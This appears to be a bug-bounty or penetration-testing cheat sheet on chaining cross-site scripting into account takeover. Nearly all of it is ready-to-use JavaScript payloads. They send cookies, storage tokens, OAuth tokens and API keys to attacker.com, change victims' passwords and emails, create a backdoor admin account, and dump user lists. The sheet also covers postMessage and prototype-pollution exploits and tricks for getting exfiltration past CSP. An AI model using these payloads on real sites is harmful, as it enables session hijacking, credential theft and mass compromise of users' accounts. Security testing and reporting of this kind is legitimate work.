---
tags:
  - critical
---

# XSS → Account Takeover

Turn XSS into complete account compromise.

## Overview

```
XSS → Cookie Theft         → Session Hijack → ATO
    → Password Change      → Persistent ATO
    → Email Change         → Password Reset → ATO
    → OAuth Token Theft    → API Access → ATO
    → Admin XSS           → Mass ATO
```

---

## Chain 1: Cookie Theft

**When:** Session cookie NOT HttpOnly

```javascript
// Basic exfil
fetch('https://attacker.com/?c='+document.cookie)

// Image beacon (CSP friendly)
new Image().src='https://attacker.com/?c='+document.cookie

// With context
fetch('https://attacker.com/log',{
  method:'POST',
  body:JSON.stringify({
    cookies:document.cookie,
    url:location.href,
    localStorage:JSON.stringify(localStorage)
  })
})
```

**Attack:** Victim visits XSS → Cookies sent → Replay session

---

## Chain 2: Token from Storage/DOM

**When:** Cookies HttpOnly but tokens elsewhere

```javascript
// localStorage
fetch('https://attacker.com/?t='+localStorage.getItem('auth_token'))

// sessionStorage
fetch('https://attacker.com/?t='+sessionStorage.getItem('jwt'))

// DOM element
let token = document.querySelector('meta[name="csrf-token"]').content;
fetch('https://attacker.com/?csrf='+token)

// JS variable (if exposed)
fetch('https://attacker.com/?t='+window.authToken)
```

---

## Chain 3: Password Change

**When:** No current password required OR current password visible

```javascript
// Direct password change
fetch('/api/user/password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({new_password: 'hacked123'})
})

// With CSRF token
let csrf = document.querySelector('[name=csrf_token]').value;
fetch('/api/user/password', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrf
  },
  body: JSON.stringify({new_password: 'hacked123'})
})
```

---

## Chain 4: Email Change → Password Reset

**When:** Email changeable without password verification

```javascript
// Step 1: Change email
fetch('/api/user/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
})

// Step 2: Attacker requests password reset manually
// Step 3: Reset link → attacker's email
// Step 4: Full ATO
```

---

## Chain 5: OAuth Token Theft

**When:** OAuth/social login with accessible tokens

```javascript
// From URL fragment
if (location.hash.includes('access_token')) {
  fetch('https://attacker.com/?token='+location.hash)
}

// From storage
fetch('https://attacker.com/?oauth='+localStorage.getItem('oauth_token'))

// From postMessage
window.addEventListener('message', e => {
  if (e.data.access_token) {
    fetch('https://attacker.com/?t='+e.data.access_token)
  }
})
```

---

## Chain 6: API Key / Secret Theft

**When:** Secrets visible in page/JS bundles

```javascript
// Extract from page
let apiKey = document.body.innerHTML.match(/api[_-]?key["']?\s*[:=]\s*["']([^"']+)/i);
if (apiKey) fetch('https://attacker.com/?key='+apiKey[1])

// Extract from JS config
fetch('/static/js/config.js')
  .then(r => r.text())
  .then(js => fetch('https://attacker.com/?config='+btoa(js)))
```

---

## Chain 7: Admin XSS → Mass Compromise

**When:** Stored XSS viewed by admin

```javascript
// Create backdoor admin
fetch('/admin/users/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'backdoor',
    password: 'hacked123',
    role: 'admin'
  })
})

// Dump all users
fetch('/admin/users/export')
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/dump', {method:'POST', body:data}))
```

---

## Chain 8: Prototype Pollution → XSS → ATO

**When:** Client-side prototype pollution possible

```
# Step 1: Pollute via URL
?__proto__[innerHTML]=<img src=x onerror=...payload...>

# Step 2: Application uses polluted property
element.innerHTML = config.template || '';  // template undefined → checks prototype

# Step 3: XSS fires → cookie/token theft → ATO
```

---

## Chain 9: postMessage XSS → ATO

**When:** Weak origin validation in postMessage handler

```html
<iframe src="https://vulnerable.com" id="target"></iframe>
<script>
  target.onload = () => {
    // DOM XSS
    target.contentWindow.postMessage('<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">', '*')
    
    // OR prototype pollution
    target.contentWindow.postMessage('{"__proto__":{"isAdmin":true}}', '*')
  }
</script>
```

---

## Bypassing Protections

### HttpOnly Cookies

Can't steal directly. Instead:
```javascript
// Perform actions via XSS (CSRF via XSS)
fetch('/api/change-password', {method:'POST', body:'newpass=hacked'})

// Look for tokens elsewhere (localStorage, DOM)
// Chain with other vulns
```

### CSP Blocking Exfil

```javascript
// img tags (usually allowed)
new Image().src = 'https://attacker.com/?c='+document.cookie

// DNS exfil
new Image().src = 'https://'+btoa(document.cookie).replace(/=/g,'')+'.attacker.com/x'

// Via allowed domains
fetch('https://allowed-analytics.com/?r=https://attacker.com&d='+document.cookie)
```

### SameSite Cookies

XSS is **same-site** — cookies still work! SameSite only blocks cross-site.

---

## DOM XSS Sources for Token Access

```javascript
// Check these for tokens:
location.hash.match(/token=([^&]+)/)
location.search.match(/code=([^&]+)/)
document.referrer.match(/token=([^&]+)/)

// Storage
localStorage.getItem('token')
sessionStorage.getItem('session')

// DOM
document.querySelector('[name=token]').value
document.querySelector('meta[name=api-key]').content
```

---

## Impact Template

```
This XSS vulnerability chains to complete Account Takeover:

1. XSS allows [cookie theft / password change / email change]
2. Attacker gains full access to any user's account
3. Can access all private data and perform actions as victim

Severity: Critical (affects all users)
CVSS: 9.6+ (Network/Low/None/Changed/High/High)
```

---

## Quick Reference

| XSS Type | Best ATO Chain |
|----------|----------------|
| Reflected | Cookie theft (if not HttpOnly) |
| Stored | Email change → password reset |
| DOM | Token from storage/URL |
| Admin panel | Backdoor account creation |
| OAuth callback | Token exfiltration |

---
*Related: [OAuth to ATO](oauth-to-ato.md) | [SSRF to RCE](ssrf-to-rce.md)*
